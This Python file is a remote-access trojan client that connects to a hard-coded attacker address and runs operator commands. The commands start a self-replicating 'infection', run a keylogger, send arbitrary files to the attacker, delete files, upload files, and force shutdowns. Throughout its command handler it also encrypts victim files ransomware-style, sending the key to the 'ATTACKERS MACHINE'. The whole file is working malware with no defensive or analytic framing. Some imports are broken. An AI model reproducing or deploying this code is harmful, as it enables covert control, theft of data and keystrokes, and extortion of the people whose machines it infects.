import socket  #for building tcp connection
import os     #for basic operation
import subprocess #to start shell in the system
import time
import datetime
import sys
import pyautogui
from cryptography.fernet import fernet
CHUNK_SIZE =8*1024


s = socket.socket()
host = '192.168.1.104'
port = 9999

s.connect((host, port))

while True: #start loop

    command = s.recv(1024)
    command =command.decode()
    print("[+] Command received successfully")
  
    
    if command == 'quit':
      print("[+] Connection terminated")
      break # if it quit , then break out and close socket

 #FILE DUPLICATOR   
    elif command == 'file_rep' :
          print("[+] Infection has started")
          s.send("[+] Command received".encode())
          os.system("replicator.py")

    elif command == 'lock_pc' :
          print(" [+] Locking PC")
          s.send("[+] Command received".encode())
          os.system("rundll32.exe user32.dll,LockWorkStation")

    elif command == 'keylogger' :
          print("[+] Capturing key logs")
          s.send("[+] Command received".encode())
          os.system("keylogger.py")

    elif command == 'restart' :
          print("[+] System about to restart")
          s.send("[+] Command received".encode())
          os.system("force_restart.bat")

    elif command == 'shutdown' :
          print("[+] System about to shutdown")
          s.send("[+] Command received".encode())
          os.system("shutdown.bat")

    elif command == 'client_info':
        file_path=s.recv(5000)
        file_path=file_path.decode()
        file=open(file_path, "rb")
        data=file.read()
        s.send(data)
        print("[+] Client info extracted successfully")

    elif command == "remove_file":
        file = s.recv(5000)
        file = file.decode()
        print(file)
        os.remove(file)
        print("[+] File Deleted successfully!")

    elif command == "encrypt_file":
        filename = s.recv(1024)
        filename = filename.decode()
        print("[+] Encrypted filename: ",filename)
        

        #GENERATE THE KEY
        key = Fernet.generate_key()
        file = open('key.key', 'wb')
        file.write(key)
        file.close()

        with open(filename, 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(filename, 'wb') as f:
            f.write(encrypted)
        #SEND KEY FILE TO ATTACKERS MACHINE
        new_file = open('key.key', 'rb')
        data = new_file.read()
        s.send(data)
        print("[+] Key sent successfully!")

        
    elif command == "decrypt_file":
        filename = s.recv(1024)
        filename = filename.decode()
        #print(filename)

        #RECEIVE KEY FILE FROM ATTACKERS MACHINE
        new_file = open('key.key', 'wb')
        data = s.recv(5000)
       # print(data)
        new_file.write(data)
        new_file.close()
        
        #RETRIEVE THE KEY
        file = open('key.key', 'rb')
        key = file.read()
        file.close()
        
        with open(filename, 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        try:
            decrypted = fernet.decrypt(data)

            with open(filename, 'wb') as f:
                f.write(decrypted)

        except InvalidToken as e:
            print("[+] Invalid key - Decryption unsuccessful!")



#if command[:2].decode("utf-8") == 'cd':
    # os.chdir(command[3:].decode("utf-8"))
    elif command == "view_cwd" :
        files=os.getcwd()
        files =str(files)
        s.send(files.encode())
        print("[+] Command executed successfully")
        

    elif command == "dir" :
        user_input=s.recv(5000)
        user_input =user_input.decode()
        files=os.listdir(user_input)
        files =str(files)
        s.send(files.encode())
        print("[+] Command executed successfully")
        

    elif command == 'download':
        file_path=s.recv(5000)
        file_path=file_path.decode()
        file=open(file_path, "rb")
        data=file.read()
        s.send(data)
        print("[+] File has been copied successfully")

    elif command == 'get_log':
        file_path=s.recv(5000)
        file_path=file_path.decode()
        file=open(file_path, "rb")
        data=file.read()
        s.send(data)
        print("[+] File has been copied successfully")

    elif command == 'send_file':
        filename=s.recv(6000)
        #print(filename)
        new_file =open(filename,"wb")
        data=s.recv(6000)
        #print(data)
        new_file.write(data)
        new_file.close()
        print("[+] File received successfully") 
   
    #run shell command
   # if len(command) > 0:
    else:
       print("")
       print("[+] File received successfully")

s.close()